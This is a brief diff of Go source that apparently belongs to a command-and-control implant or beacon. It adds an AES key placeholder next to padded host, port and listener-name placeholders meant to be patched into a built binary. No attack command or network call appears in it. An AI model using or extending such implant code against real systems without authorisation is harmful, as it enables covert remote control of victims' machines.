@@ -176,6 +176,7 @@ func main() {
 	Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
 	Port := "PortAAAABBBBCCCCDDDD"
 	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
+	PcInfo.AesKey = "AeskAAAABBBBCCCC"
 	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
 	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
 	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
